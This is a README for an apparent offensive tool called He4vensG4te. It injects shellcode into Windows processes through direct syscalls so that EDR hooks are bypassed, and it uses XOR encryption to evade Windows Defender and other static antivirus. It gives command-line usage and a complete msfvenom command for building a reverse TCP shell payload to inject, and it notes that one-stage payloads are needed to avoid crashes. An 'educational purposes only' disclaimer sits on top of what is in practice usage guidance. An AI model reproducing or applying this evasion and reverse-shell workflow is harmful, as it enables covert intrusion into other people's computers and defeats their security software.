# He4vensG4te
Process Injection Using direct syscalls only 

FOR EDUCATIONAL PURPOSES ONLY THIS CODE IS NOT MEANT TO BE WEPONIZED OR USED FOR MALICIOUS INTENTS
# technique explanation

just like a normal process injection we first get a handle to the target process , allocate space inside it, write the shellcode then create a thread that executes the shellcode 

now in each of these steps we have to use a win api function not just risking that some of these functions might be hooked by edrs but also this patters is so knows and any behavioral analysis will flag the malware so i wroked on my own version of the hellsgate technique to directly call the syscall instead of using high level win api functions

# how does it work 

its pretty simple and i already explained it here https://github.com/B4shCr00k/DirectSysCalls so we just call the stub everytime we call an nt function and repeat until we complete all the steps 

i also included a simple xor encryption to bypass static avs like win defender 

# Usage 
`He4vensG4te.exe [path] [pid]`

-  path must use double back slashes '\\'
-  tested on windows 11 x64 latest build
-  bypasses windows defender and some other static avs  

# Important note 
for the shellcode it has to be a .bin file you can generate one using metasploit like this 
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f raw -o shellcode.bin`
the thing is u have to use a one stage payload cause i noticed that when i inject a multi stage meterpreter reverse shell the process crashes and the connection failed so the command above will generate a one stage simple reverse shell that actually works 

# ScreenShots
![Screenshot 2025-06-14 194559](https://github.com/user-attachments/assets/bd4e0cfb-6c2b-4695-a374-3c78be4fd893)
![Screenshot 2025-06-14 194936](https://github.com/user-attachments/assets/c880f7ab-04fe-4140-b667-fc1351fc49cb)
